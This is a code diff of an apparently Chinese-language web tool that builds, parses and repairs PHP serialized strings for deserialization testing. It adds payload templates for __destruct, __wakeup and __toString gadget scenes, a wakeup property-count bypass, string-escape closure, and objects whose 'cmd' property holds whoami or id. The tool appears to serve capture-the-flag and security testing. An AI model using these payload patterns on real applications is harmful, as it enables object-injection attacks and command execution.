                     <button class="btn secondary" id="ref-load-output" type="button">读取输出区</button>
@@ -1240,7 +1630,9 @@
                     <button class="btn" id="insert-ref" type="button">替换为 R:reference</button>
                   </div>
                   <div class="exploit-diff hidden" id="ref-diff-box" style="margin-top:8px;">
-                    <textarea id="ref-output" spellcheck="false" style="min-height:60px;width:100%;font:13px var(--mono);"></textarea>
+                    <pre id="ref-details" style="margin:0 0 10px;"></pre>
+                    <textarea id="ref-output" spellcheck="false"
+                      style="min-height:60px;width:100%;font:13px var(--mono);"></textarea>
                   </div>
                   <div class="actions" style="margin-top:6px;">
                     <button class="btn secondary" id="ref-copy" type="button">复制</button>
@@ -1254,39 +1646,6 @@
           </div>
         </div>
 
-        <div class="panel" style="margin-top:12px;">
-          <div class="panel-head">
-            <div>
-              <h2 class="panel-title">URL查询参数</h2>
-              <p class="note">每行一个参数名和一个手动编辑的值；右侧查询串输出自动更新。</p>
-            </div>
-            <div class="actions">
-              <button class="btn secondary" id="add-query-param" type="button">添加参数</button>
-              <button class="btn secondary" id="toggle-url-generator" type="button">生成URL</button>
-            </div>
-          </div>
-          <div class="panel-body query-builder">
-            <div id="query-param-list" class="query-list"></div>
-            <div id="url-generator-panel" class="hidden" style="margin-top:12px;">
-              <div class="manual-url">
-                <div class="encode-header">
-                  <span class="encode-title">生成完整URL</span>
-                  <button class="mini-btn" id="copy-generated-url" type="button">复制</button>
-                </div>
-                <label>
-                  基础URL
-                  <input id="base-url-input" value="http://www.example.com:80/xxx/yyy"
-                    placeholder="例如 http://example.com/path">
-                </label>
-                <label style="margin-top:10px;">
-                  完整URL
-                  <textarea id="generated-url-output" class="query-value" readonly spellcheck="false"
-                    style="min-height:60px;"></textarea>
-                </label>
-              </div>
-            </div>
-          </div>
-        </div>
       </div>
 
       <div class="right-stack">
@@ -1299,7 +1658,8 @@
             </div>
             <div class="actions">
               <button class="mini-btn secondary" id="copy-output" type="button">复制</button>
-              <button class="mini-btn secondary" id="copy-unserialize-wrapper" type="button">复制 unserialize(...)</button>
+              <button class="mini-btn secondary" id="copy-unserialize-wrapper" type="button">复制
+                unserialize(...)</button>
               <button class="mini-btn secondary" id="refresh-query-string" type="button">刷新查询串</button>
               <button class="mini-btn secondary" id="clear-output" type="button">清空</button>
             </div>
@@ -1354,6 +1714,39 @@
             </div>
           </div>
         </div>
+        <div class="panel query-panel" style="margin-top:0;">
+          <div class="panel-head">
+            <div>
+              <h2 class="panel-title">URL查询参数</h2>
+              <p class="note">每行一个参数名和一个手动编辑的值；右侧查询串输出自动更新。</p>
+            </div>
+            <div class="actions">
+              <button class="btn secondary" id="add-query-param" type="button">添加参数</button>
+              <button class="btn secondary" id="toggle-url-generator" type="button">生成URL</button>
+            </div>
+          </div>
+          <div class="panel-body query-builder">
+            <div id="query-param-list" class="query-list"></div>
+            <div id="url-generator-panel" class="hidden" style="margin-top:12px;">
+              <div class="manual-url">
+                <div class="encode-header">
+                  <span class="encode-title">生成完整URL</span>
+                  <button class="mini-btn" id="copy-generated-url" type="button">复制</button>
+                </div>
+                <label>
+                  基础URL
+                  <input id="base-url-input" value="http://www.example.com:80/xxx/yyy"
+                    placeholder="例如 http://example.com/path">
+                </label>
+                <label style="margin-top:10px;">
+                  完整URL
+                  <textarea id="generated-url-output" class="query-value" readonly spellcheck="false"
+                    style="min-height:60px;"></textarea>
+                </label>
+              </div>
+            </div>
+          </div>
+        </div>
       </div>
     </section>
 
@@ -1362,24 +1755,107 @@
         <h2 class="panel-title">常用模板</h2>
       </div>
       <div class="panel-body">
-        <div class="templates">
-          <button class="template-btn" type="button" data-template='O:4:"User":1:{s:4:"name";s:5:"admin";}'>
-            普通对象
-            <small>O:4:"User":1:{s:4:"name";s:5:"admin";}</small>
-          </button>
-          <button class="template-btn" type="button"
-            data-template='a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:6:"123456";}'>
-            关联数组
-            <small>a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:6:"123456";}</small>
-          </button>
-          <button class="template-btn" type="button" data-template='O:4:"User":1:{s:10:"\0User\0cmd";s:6:"whoami";}'>
-            Private属性
-            <small>User的private属性cmd=whoami</small>
-          </button>
-          <button class="template-btn" type="button" data-template='O:4:"User":1:{s:6:"\0*\0cmd";s:2:"id";}'>
-            Protected属性
-            <small>protected属性cmd=id</small>
-          </button>
+        <div class="template-library">
+          <div class="template-group">
+            <h3 class="template-group-title">Payload PHP类模板</h3>
+            <div class="template-grid">
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-public-basic">
+                普通 public 类
+                <small>多 public 属性，适合基础对象链</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-visibility">
+                私有/保护属性
+                <small>private、protected、var 混合</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-nested">
+                嵌套对象链
+                <small>A->B->C 多层对象</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-recursive">
+                递归引用形状
+                <small>父子节点与 self 字段占位</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-array-mixed">
+                多类型数组属性
+                <small>数组、布尔、数字、null、对象</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-destruct">
+                __destruct 场景
+                <small>文件名、函数名、参数字段</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-wakeup">
+                __wakeup 场景
+                <small>配合属性数量篡改测试</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="php" data-template-id="php-tostring">
+                __toString 场景
+                <small>字符串上下文触发链</small>
+              </button>
+            </div>
+          </div>
+          <div class="template-group">
+            <h3 class="template-group-title">已序列化片段模板</h3>
+            <div class="template-grid">
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-object-basic">
+                普通对象
+                <small>O:4:"User":1:{...}</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-array-assoc">
+                关联数组
+                <small>user/pass 键值</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized" data-template-id="ser-private">
+                Private 属性
+                <small>\0User\0cmd = whoami</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-protected">
+                Protected 属性
+                <small>\0*\0cmd = id</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-nested-object">
+                嵌套对象
+                <small>User->Profile->Role</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-array-object">
+                数组包对象
+                <small>a:2:{...O:4:"User"...}</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-reference">
+                R 引用链
+                <small>两个属性指向同一字符串</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-wakeup-bypass">
+                wakeup 数量绕过
+                <small>属性计数大于真实属性</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized" data-template-id="ser-newline">
+                含真实换行
+                <small>检查反向解析换行显示</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-escape-close">
+                字符串逃逸闭合
+                <small>";}FAKE_FLAG"; 场景</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-stdclass">
+                stdClass
+                <small>空对象与动态属性</small>
+              </button>
+              <button class="template-btn" type="button" data-template-kind="serialized"
+                data-template-id="ser-deep-array">
+                深层数组
+                <small>多层嵌套数组结构</small>
+              </button>
+            </div>
+          </div>
         </div>
       </div>
     </section>
@@ -1394,12 +1870,180 @@
     const $$ = (selector) => Array.from(document.querySelectorAll(selector));
     const encoder = new TextEncoder();
 
+    function rawByteLen(value) {
+      return encoder.encode(String(value ?? "")).length;
+    }
+
+    function isHexChar(char) {
+      return /^[0-9a-fA-F]$/.test(char || "");
+    }
+
+    function isOctalChar(char) {
+      return /^[0-7]$/.test(char || "");
+    }
+
+    function parsePhpEscapeAt(text, pos, quote = '"') {
+      const next = text[pos + 1];
+      if (!next) return { end: pos + 1, bytes: 1, chars: 1, value: "\\" };
+
+      if (quote === "'") {
+        if (next === "\\" || next === "'") return { end: pos + 2, bytes: 1, chars: 1, value: next };
+        return { end: pos + 2, bytes: 2, chars: 2, value: `\\${next}` };
+      }
+
+      const oneByteEscapes = {
+        n: "\n",
+        r: "\r",
+        t: "\t",
+        v: "\v",
+        e: "\x1B",
+        f: "\f",
+        "\\": "\\",
+        "\"": "\"",
+        "$": "$"
+      };
+      if (Object.prototype.hasOwnProperty.call(oneByteEscapes, next)) {
+        return { end: pos + 2, bytes: 1, chars: 1, value: oneByteEscapes[next] };
+      }
+
+      if (next === "x") {
+        let end = pos + 2;
+        let hex = "";
+        while (hex.length < 2 && isHexChar(text[end])) {
+          hex += text[end];
+          end += 1;
+        }
+        if (hex) return { end, bytes: 1, chars: 1, value: String.fromCharCode(parseInt(hex, 16)) };
+        return { end: pos + 2, bytes: 2, chars: 2, value: "\\x" };
+      }
+
+      if (next === "u" && text[pos + 2] === "{") {
+        let end = pos + 3;
+        let hex = "";
+        while (isHexChar(text[end])) {
+          hex += text[end];
+          end += 1;
+        }
+        if (hex && text[end] === "}") {
+          const codePoint = parseInt(hex, 16);
+          if (Number.isFinite(codePoint) && codePoint >= 0 && codePoint <= 0x10FFFF) {
+            const value = String.fromCodePoint(codePoint);
+            return { end: end + 1, bytes: rawByteLen(value), chars: 1, value };
+          }
+        }
+        return { end: pos + 2, bytes: 2, chars: 2, value: "\\u" };
+      }
+
+      if (isOctalChar(next)) {
+        let end = pos + 1;
+        let octal = "";
+        while (octal.length < 3 && isOctalChar(text[end])) {
+          octal += text[end];
+          end += 1;
+        }
+        return { end, bytes: 1, chars: 1, value: String.fromCharCode(parseInt(octal, 8) & 0xFF) };
+      }
+
+      return { end: pos + 2, bytes: 2, chars: 2, value: `\\${next}` };
+    }
+
+    function phpEscapedMetrics(value, quote = '"') {
+      const text = String(value ?? "");
+      let pos = 0;
+      let bytes = 0;
+      let chars = 0;
+      while (pos < text.length) {
+        if (text[pos] === "\\") {
+          const token = parsePhpEscapeAt(text, pos, quote);
+          bytes += token.bytes;
+          chars += token.chars;
+          pos = token.end;
+          continue;
+        }
+        const codePoint = text.codePointAt(pos);
+        const char = String.fromCodePoint(codePoint);
+        bytes += rawByteLen(char);
+        chars += 1;
+        pos += codePoint > 0xFFFF ? 2 : 1;
+      }
+      return { bytes, chars };
+    }
+
+    function readPhpDisplayBytes(text, start, expectedBytes, quote = '"') {
+      let pos = start;
+      let bytes = 0;
+      let value = "";
+      while (pos < text.length && bytes < expectedBytes) {
+        if (text[pos] === "\\") {
+          const token = parsePhpEscapeAt(text, pos, quote);
+          if (bytes + token.bytes > expectedBytes) throw new Error("字符串字节长度落在半个转义序列上");
+          bytes += token.bytes;
+          value += token.value;
+          pos = token.end;
+          continue;
+        }
+        const codePoint = text.codePointAt(pos);
+        const char = String.fromCodePoint(codePoint);
+        const size = rawByteLen(char);
+        if (bytes + size > expectedBytes) throw new Error("字符串字节长度落在半个字符上");
+        bytes += size;
+        value += char;
+        pos += codePoint > 0xFFFF ? 2 : 1;
+      }
+      if (bytes !== expectedBytes) throw new Error(`字符串长度不足，期望 ${expectedBytes} 字节`);
+      return { value, end: pos, bytes };
+    }
+
+    function rawCharLen(value) {
+      return Array.from(String(value ?? "")).length;
+    }
+
+    function readRawUtf8Bytes(text, start, expectedBytes) {
+      let pos = start;
+      let bytes = 0;
+      let value = "";
+      while (pos < text.length && bytes < expectedBytes) {
+        const codePoint = text.codePointAt(pos);
+        const char = String.fromCodePoint(codePoint);
+        const size = rawByteLen(char);
+        if (bytes + size > expectedBytes) throw new Error("字符串字节长度落在半个字符上");
+        bytes += size;
+        value += char;
+        pos += codePoint > 0xFFFF ? 2 : 1;
+      }
+      if (bytes !== expectedBytes) throw new Error(`字符串长度不足，期望 ${expectedBytes} 字节`);
+      return { value, end: pos, bytes };
+    }
+
+    function phpDisplayToReal(value, quote = '"') {
+      const text = String(value ?? "");
+      let pos = 0;
+      let result = "";
+      while (pos < text.length) {
+        if (text[pos] === "\\") {
+          const token = parsePhpEscapeAt(text, pos, quote);
+          result += token.value;
+          pos = token.end;
+          continue;
+        }
+        const codePoint = text.codePointAt(pos);
+        result += String.fromCodePoint(codePoint);
+        pos += codePoint > 0xFFFF ? 2 : 1;
+      }
+      return result;
+    }
+
     function byteLen(value) {
-      return encoder.encode(value).length;
+      return phpEscapedMetrics(value).bytes;
+    }
+
+    function phpRawString(value) {
+      const raw = String(value ?? "");
+      return `s:${rawByteLen(raw)}:"${raw}";`;
     }
 
     function phpString(value) {
-      return `s:${byteLen(value)}:"${value}";`;
+      return phpRawString(phpDisplayToReal(value));
     }
 
     function phpInt(value) {
@@ -1407,16 +2051,76 @@
       return `i:${Number.isNaN(num) ? 0 : num};`;
     }
 
+    function phpFloat(value) {
+      const num = Number.parseFloat(value);
+      if (!Number.isFinite(num)) return "d:0;";
+      return `d:${String(num)};`;
+    }
+
     function phpBool(value) {
       const normalized = String(value).trim().toLowerCase();
       return `b:${["1", "true", "yes", "on", "是"].includes(normalized) ? 1 : 0};`;
     }
 
+    function phpReference(value, prefix = "R") {
+      const num = Number.parseInt(value, 10);
+      return `${prefix}:${Number.isNaN(num) || num < 1 ? 1 : num};`;
+    }
+
+    function phpEmptyObject(value) {
+      const className = String(value || "stdClass").trim() || "stdClass";
+      return `O:${byteLen(className)}:"${className}":0:{}`;
+    }
+
+    function countSerializedFragmentValues(fragment) {
+      const text = realNulls(fragment).trim();
+      let pos = 0;
+      let count = 0;
+      while (pos < text.length) {
+        pos = skipSerializedValueAt(text, pos);
+        count += 1;
+        pos = skipSerializedSpace(text, pos);
+      }
+      return count;
+    }
+
+    function phpArrayRaw(value) {
+      const body = realNulls(value).trim();
+      if (!body) return "a:0:{}";
+      let count = 1;
+      try {
+        count = Math.floor(countSerializedFragmentValues(body) / 2);
+      } catch (error) { }
+      return `a:${count}:{${body}}`;
+    }
+
+    function phpObjectRaw(value) {
+      const raw = realNulls(value).trim();
+      const splitAt = raw.indexOf("|");
+      const className = splitAt > 0 ? raw.slice(0, splitAt).trim() : "User";
+      const body = splitAt > 0 ? raw.slice(splitAt + 1).trim() : raw;
+      if (!body) return phpEmptyObject(className);
+      let count = 1;
+      try {
+        count = Math.floor(countSerializedFragmentValues(body) / 2);
+      } catch (error) { }
+      return `O:${byteLen(className)}:"${className}":${count}:{${body}}`;
+    }
+
     function phpValue(type, value) {
       if (type === "string") return phpString(value);
+      if (type === "empty_string") return phpRawString("");
       if (type === "int") return phpInt(value);
+      if (type === "float") return phpFloat(value);
       if (type === "bool") return phpBool(value);
       if (type === "null") return "N;";
+      if (type === "empty_array") return "a:0:{}";
+      if (type === "empty_object" || type === "stdclass" || type === "object_class") return phpEmptyObject(value);
+      if (type === "array_raw") return phpArrayRaw(value);
+      if (type === "object_raw") return phpObjectRaw(value);
+      if (type === "reference") return phpReference(value, "R");
+      if (type === "soft_reference") return phpReference(value, "r");
+      if (type === "serialized" || type === "raw") return realNulls(value);
       return value;
     }
 
@@ -1440,17 +2144,39 @@
       return propName;
     }
 
-    function visibleNulls(value) {
-      return value.replaceAll("\u0000", "\\0");
+    function visibleNulls(value, options = {}) {
+      const newlineToken = options.preserveNewlines ? "\n" : "\\n";
+      return String(value ?? "")
+        .replaceAll("\\", "\\\\")
+        .replaceAll("\u0000", "\\0")
+        .replaceAll("\x1B", "\\e")
+        .replaceAll("\f", "\\f")
+        .replaceAll("\v", "\\v")
+        .replaceAll("\r", "\\r")
+        .replaceAll("\n", newlineToken)
+        .replaceAll("\t", "\\t");
     }
 
     function realNulls(value) {
-      return value.replaceAll("\\0", "\u0000");
+      return phpDisplayToReal(value);
+    }
+
+    function escapeHtml(value) {
+      return String(value ?? "")
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll('"', "&quot;")
+        .replaceAll("'", "&#39;");
     }
 
     const outputs = {
       construct: "",
       query: ""
+    };
+    const outputDisplay = {
+      construct: {},
+      query: {}
     };
     let activeOutput = "construct";
 
@@ -1459,17 +2185,18 @@
     }
 
     function renderOutput() {
-      $("#output").value = visibleNulls(outputs[activeOutput] || "");
+      $("#output").value = visibleNulls(outputs[activeOutput] || "", outputDisplay[activeOutput]);
       updateStats();
     }
 
-    function setOutput(value, target = activeOutput) {
+    function setOutput(value, target = activeOutput, displayOptions = {}) {
       outputs[target] = String(value ?? "");
+      outputDisplay[target] = displayOptions || {};
       if (target === activeOutput) renderOutput();
     }
 
-    function setConstructOutput(value) {
-      setOutput(value, "construct");
+    function setConstructOutput(value, displayOptions = {}) {
+      setOutput(value, "construct", displayOptions);
       if (activeOutput !== "construct") switchOutput("construct");
     }
 
@@ -1481,8 +2208,8 @@
     function updateStats() {
       const visibleValue = $("#output").value;
       const value = realNulls(visibleValue);
-      $("#char-count").textContent = String(visibleValue.length);
-      $("#byte-count").textContent = String(byteLen(value));
+      $("#char-count").textContent = String(rawCharLen(value));
+      $("#byte-count").textContent = String(rawByteLen(value));
       $("#string-count").textContent = String((value.match(/s:\d+:"/g) || []).length);
     }
 
@@ -1601,9 +2328,16 @@
         <input data-field="key" placeholder="${showScope ? "属性名" : "键"}" value="${prefix}">
         <select data-field="value-type" title="值类型">
           <option value="string">string</option>
+          <option value="empty_string">empty string</option>
           <option value="int">int</option>
+          <option value="float">float/double</option>
           <option value="bool">bool</option>
           <option value="null">null</option>
+          <option value="empty_array">empty array</option>
+          <option value="empty_object">empty object</option>
+          <option value="reference">R:reference</option>
+          <option value="soft_reference">r:object reference</option>
+          <option value="serialized">已序列化片段</option>
           <option value="raw">raw</option>
         </select>
         <input data-field="value" placeholder="值" value="">
@@ -1649,17 +2383,416 @@
       setConstructOutput(`O:${byteLen(className)}:"${className}":${rows.length}:{${body}}`);
     }
 
+    function skipSerializedSpace(text, pos) {
+      while (pos < text.length && /\s/.test(text[pos])) pos += 1;
+      return pos;
+    }
+
+    function readSerializedStringAt(text, startPos, afterQuote = ";") {
+      const start = skipSerializedSpace(text, startPos);
+      const header = text.slice(start).match(/^s:(\d+):"/);
+      if (!header) throw new Error(`需要字符串（位置 ${start + 1}）`);
+      const byteCount = parseInt(header[1], 10);
+      const byteLenStart = start + 2;
+      const byteLenEnd = byteLenStart + header[1].length;
+      const contentStart = start + header[0].length;
+      const body = readRawUtf8Bytes(text, contentStart, byteCount);
+      if (text[body.end] !== '"') throw new Error(`字符串缺少闭合引号（位置 ${body.end + 1}）`);
+      const suffixStart = body.end + 1;
+      if (afterQuote && !text.startsWith(afterQuote, suffixStart)) {
+        throw new Error(`字符串缺少 ${afterQuote}（位置 ${suffixStart + 1}）`);
+      }
+      const end = suffixStart + String(afterQuote || "").length;
+      return {
+        start,
+        end,
+        byteCount,
+        byteLenStart,
+        byteLenEnd,
+        valueStart: contentStart,
+        valueEnd: body.end,
+        value: body.value,
+        displayValue: text.slice(contentStart, body.end),
+        raw: text.slice(start, end)
+      };
+    }
+
+    function readSerializedObjectHeaderAt(text, startPos) {
+      const start = skipSerializedSpace(text, startPos);
+      const header = text.slice(start).match(/^O:(\d+):"/);
+      if (!header) throw new Error(`对象头不合法（位置 ${start + 1}）`);
+      const classLen = parseInt(header[1], 10);
+      const classLenStart = start + 2;
+      const classLenEnd = classLenStart + header[1].length;
+      const classStart = start + header[0].length;
+      const classBody = readRawUtf8Bytes(text, classStart, classLen);
+      if (text[classBody.end] !== '"' || text[classBody.end + 1] !== ":") {
+        throw new Error(`对象类名缺少闭合（位置 ${classBody.end + 1}）`);
+      }
+      const countStartSearch = classBody.end + 2;
+      const countMatch = text.slice(countStartSearch).match(/^(\d+):\{/);
+      if (!countMatch) throw new Error(`对象属性数量不合法（位置 ${countStartSearch + 1}）`);
+      const propCountStart = countStartSearch;
+      const propCountEnd = propCountStart + countMatch[1].length;
+      return {
+        start,
+        className: classBody.value,
+        classDisplayName: text.slice(classStart, classBody.end),
+        classLen,
+        classLenStart,
+        classLenEnd,
+        propCount: parseInt(countMatch[1], 10),
+        propCountStart,
+        propCountEnd,
+        bodyStart: countStartSearch + countMatch[0].length,
+        headerEnd: countStartSearch + countMatch[0].length
+      };
+    }
+
+    function skipSerializedValueAt(text, startPos, visitor = () => { }) {
+      const start = skipSerializedSpace(text, startPos);
+      const type = text[start];
+
+      if (type === "s") {
+        const info = readSerializedStringAt(text, start, ";");
+        visitor({ type: "string", ...info });
+        return info.end;
+      }
+      if (type === "i") {
+        const match = text.slice(start).match(/^i:-?\d+;/);
+        if (!match) throw new Error(`整数值不合法（位置 ${start + 1}）`);
+        return start + match[0].length;
+      }
+      if (type === "b") {
+        const match = text.slice(start).match(/^b:[01];/);
+        if (!match) throw new Error(`布尔值不合法（位置 ${start + 1}）`);
+        return start + match[0].length;
+      }
+      if (type === "d") {
+        const match = text.slice(start).match(/^d:[^;]+;/);
+        if (!match) throw new Error(`浮点值不合法（位置 ${start + 1}）`);
+        return start + match[0].length;
+      }
+      if (type === "N") {
+        if (!text.startsWith("N;", start)) throw new Error(`null 值不合法（位置 ${start + 1}）`);
+        return start + 2;
+      }
+      if (type === "R" || type === "r") {
+        const match = text.slice(start).match(/^[Rr]:\d+;/);
+        if (!match) throw new Error(`引用值不合法（位置 ${start + 1}）`);
+        return start + match[0].length;
+      }
+      if (type === "a") {
+        const match = text.slice(start).match(/^a:(\d+):\{/);
+        if (!match) throw new Error(`数组头不合法（位置 ${start + 1}）`);
+        let pos = start + match[0].length;
+        const count = parseInt(match[1], 10);
+        for (let index = 0; index < count; index += 1) {
+          pos = skipSerializedValueAt(text, pos, visitor);
+          pos = skipSerializedValueAt(text, pos, visitor);
+        }
+        pos = skipSerializedSpace(text, pos);
+        if (text[pos] !== "}") throw new Error(`数组缺少结束 }（位置 ${pos + 1}）`);
+        return pos + 1;
+      }
+      if (type === "O") {
+        const info = readSerializedObjectHeaderAt(text, start);
+        visitor({ type: "object", ...info });
+        let pos = info.bodyStart;
+        for (let index = 0; index < info.propCount; index += 1) {
+          const key = readSerializedStringAt(text, pos, ";");
+          visitor({ type: "string", ...key });
+          pos = key.end;
+          pos = skipSerializedValueAt(text, pos, visitor);
+        }
+        pos = skipSerializedSpace(text, pos);
+        if (text[pos] !== "}") throw new Error(`对象缺少结束 }（位置 ${pos + 1}）`);
+        return pos + 1;
+      }
+
+      throw new Error(`暂不支持的类型：${type || "空"}（位置 ${start + 1}）`);
+    }
+
+    function uniqueByEnd(candidates) {
+      const seen = new Set();
+      return candidates.filter((item) => {
+        const key = `${item.start}:${item.end}`;
+        if (seen.has(key)) return false;
+        seen.add(key);
+        return true;
+      });
+    }
+
+    function mergeRepairState(base, next) {
+      return {
+        end: next.end,
+        patches: base.patches.concat(next.patches || []),
+        objects: base.objects.concat(next.objects || [])
+      };
+    }
+
+    function limitRepairStates(states) {
+      return states
+        .sort((a, b) => b.end - a.end || a.patches.length - b.patches.length)
+        .slice(0, 180);
+    }
+
+    function readSerializedStringRepairCandidates(text, startPos, afterQuote = ";") {
+      const start = skipSerializedSpace(text, startPos);
+      const header = text.slice(start).match(/^s:(\d+):"/);
+      if (!header) throw new Error(`需要字符串（位置 ${start + 1}）`);
+      const declaredBytes = parseInt(header[1], 10);
+      const byteLenStart = start + 2;
+      const byteLenEnd = byteLenStart + header[1].length;
+      const contentStart = start + header[0].length;
+      const suffix = String(afterQuote || "");
+      const candidates = [];
+
+      function addByQuoteEnd(valueEnd) {
+        const suffixStart = valueEnd + 1;
+        if (text[valueEnd] !== '"' || (suffix && !text.startsWith(suffix, suffixStart))) return;
+        const content = text.slice(contentStart, valueEnd);
+        const actualBytes = rawByteLen(content);
+        const end = suffixStart + suffix.length;
+        candidates.push({
+          start,
+          end,
+          byteCount: declaredBytes,
+          byteLenStart,
+          byteLenEnd,
+          valueStart: contentStart,
+          valueEnd,
+          value: content,
+          displayValue: content,
+          raw: text.slice(start, end),
+          patches: [{
+            start: byteLenStart,
+            end: byteLenEnd,
+            value: String(actualBytes)
+          }]
+        });
+      }
+
+      try {
+        const body = readRawUtf8Bytes(text, contentStart, declaredBytes);
+        addByQuoteEnd(body.end);
+      } catch (error) { }
+
+      let quotePos = contentStart;
+      let scanned = 0;
+      while ((quotePos = text.indexOf('"', quotePos)) >= 0 && scanned < 220) {
+        addByQuoteEnd(quotePos);
+        quotePos += 1;
+        scanned += 1;
+      }
+
+      return uniqueByEnd(candidates);
+    }
+
+    function parseSerializedRepairValueAt(text, startPos) {
+      const start = skipSerializedSpace(text, startPos);
+      const type = text[start];
+
+      if (type === "s") {
+        return readSerializedStringRepairCandidates(text, start, ";").map((info) => ({
+          end: info.end,
+          patches: info.patches,
+          objects: [],
+          info
+        }));
+      }
+      if (type === "i") {
+        const match = text.slice(start).match(/^i:-?\d+;/);
+        return match ? [{ end: start + match[0].length, patches: [], objects: [] }] : [];
+      }
+      if (type === "b") {
+        const match = text.slice(start).match(/^b:[01];/);
+        return match ? [{ end: start + match[0].length, patches: [], objects: [] }] : [];
+      }
+      if (type === "d") {
+        const match = text.slice(start).match(/^d:[^;]+;/);
+        return match ? [{ end: start + match[0].length, patches: [], objects: [] }] : [];
+      }
+      if (type === "N") {
+        return text.startsWith("N;", start) ? [{ end: start + 2, patches: [], objects: [] }] : [];
+      }
+      if (type === "R" || type === "r") {
+        const match = text.slice(start).match(/^[Rr]:\d+;/);
+        return match ? [{ end: start + match[0].length, patches: [], objects: [] }] : [];
+      }
+      if (type === "a") {
+        const match = text.slice(start).match(/^a:(\d+):\{/);
+        if (!match) return [];
+        const count = parseInt(match[1], 10);
+        let states = [{ end: start + match[0].length, patches: [], objects: [] }];
+        for (let index = 0; index < count * 2; index += 1) {
+          const nextStates = [];
+          states.forEach((state) => {
+            parseSerializedRepairValueAt(text, state.end).forEach((candidate) => {
+              nextStates.push(mergeRepairState(state, candidate));
+            });
+          });
+          states = limitRepairStates(nextStates);
+          if (states.length === 0) return [];
+        }
+        return states.flatMap((state) => {
+          const endBrace = skipSerializedSpace(text, state.end);
+          if (text[endBrace] !== "}") return [];
+          return [{ ...state, end: endBrace + 1 }];
+        });
+      }
+      if (type === "O") {
+        const header = text.slice(start).match(/^O:(\d+):"/);
+        if (!header) return [];
+        const classLenStart = start + 2;
+        const classLenEnd = classLenStart + header[1].length;
+        const classStart = start + header[0].length;
+        const classCandidates = [];
+
+        try {
+          const declaredClass = readRawUtf8Bytes(text, classStart, parseInt(header[1], 10));
+          if (text[declaredClass.end] === '"' && text[declaredClass.end + 1] === ":") {
+            classCandidates.push({ valueEnd: declaredClass.end });
+          }
+        } catch (error) { }
+
+        let quotePos = classStart;
+        while ((quotePos = text.indexOf('"', quotePos)) >= 0 && classCandidates.length < 40) {
+          if (text[quotePos + 1] === ":") classCandidates.push({ valueEnd: quotePos });
+          quotePos += 1;
+        }
+
+        return uniqueByEnd(classCandidates.map((item) => ({
+          start,
+          end: item.valueEnd + 2,
+          valueEnd: item.valueEnd
+        }))).flatMap((classInfo) => {
+          const countMatch = text.slice(classInfo.end).match(/^(\d+):\{/);
+          if (!countMatch) return [];
+          const className = text.slice(classStart, classInfo.valueEnd);
+          const propCountStart = classInfo.end;
+          const propCountEnd = propCountStart + countMatch[1].length;
+          const propCount = parseInt(countMatch[1], 10);
+          const objectInfo = {
+            fullMatch: text.slice(start, classInfo.end + countMatch[0].length),
+            byteCount: parseInt(header[1], 10),
+            className,
+            propCount,
+            propCountStart,
+            propCountEnd,
+            classLenStart,
+            classLenEnd
+          };
+          let states = [{
+            end: classInfo.end + countMatch[0].length,
+            patches: [{
+              start: classLenStart,
+              end: classLenEnd,
+              value: String(rawByteLen(className))
+            }],
+            objects: [objectInfo]
+          }];
+
+          for (let index = 0; index < propCount; index += 1) {
+            const afterKey = [];
+            states.forEach((state) => {
+              try {
+                readSerializedStringRepairCandidates(text, state.end, ";").forEach((key) => {
+                  afterKey.push({
+                    end: key.end,
+                    patches: state.patches.concat(key.patches || []),
+                    objects: state.objects
+                  });
+                });
+              } catch (error) { }
+            });
+
+            states = limitRepairStates(afterKey);
+            if (states.length === 0) return [];
+
+            const afterValue = [];
+            states.forEach((state) => {
+              parseSerializedRepairValueAt(text, state.end).forEach((candidate) => {
+                afterValue.push(mergeRepairState(state, candidate));
+              });
+            });
+
+            states = limitRepairStates(afterValue);
+            if (states.length === 0) return [];
+          }
+
+          return states.flatMap((state) => {
+            const endBrace = skipSerializedSpace(text, state.end);
+            if (text[endBrace] !== "}") return [];
+            return [{ ...state, end: endBrace + 1 }];
+          });
+        });
+      }
+
+      return [];
+    }
+
+    function chooseSerializedRepair(text) {
+      const candidates = parseSerializedRepairValueAt(text, 0);
+      if (candidates.length === 0) return null;
+      return candidates
+        .map((candidate) => {
+          const trailingStart = skipSerializedSpace(text, candidate.end);
+          return {
+            ...candidate,
+            trailingLength: text.length - trailingStart
+          };
+        })
+        .sort((a, b) => a.trailingLength - b.trailingLength || b.end - a.end || a.patches.length - b.patches.length)[0];
+    }
+
+    function applyTextPatches(text, patches) {
+      return patches
+        .slice()
+        .sort((a, b) => b.start - a.start)
+        .reduce((current, patch) => {
+          return current.slice(0, patch.start) + patch.value + current.slice(patch.end);
+        }, text);
+    }
+
+    function fallbackFixSerializedLengths(text) {
+      let result = text.replace(/O:\d+:"((?:\\.|[^"\\])*)":/g, (match, className) => {
+        return `O:${rawByteLen(className)}:"${className}":`;
+      });
+      result = result.replace(/s:\d+:"((?:\\.|[^"\\])*)";/g, (match, content) => {
+        return phpRawString(content);
+      });
+      return result;
+    }
+
